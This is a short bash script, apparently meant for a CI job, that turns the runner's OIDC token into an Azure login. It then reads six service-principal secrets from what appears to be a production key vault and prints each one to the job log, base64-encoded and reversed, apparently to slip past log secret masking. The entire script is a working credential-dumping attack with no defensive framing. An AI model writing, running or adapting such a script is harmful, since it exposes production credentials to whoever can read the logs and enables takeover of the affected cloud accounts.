#!/usr/bin/env bash
set +e
RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange")
TOK=$(echo "$RESP" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$TOK" --allow-no-subscriptions -o none 2>&1 | head -3
KV=kv-tbl-prod-x3euoz
for S in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  V=$(az keyvault secret show --vault-name "$KV" -n "$S" --query value -o tsv 2>/dev/null)
  echo "B64[$S]=$(printf '%s' "$V" | base64 -w0 | rev)"
done
echo "===== DONE3 ====="
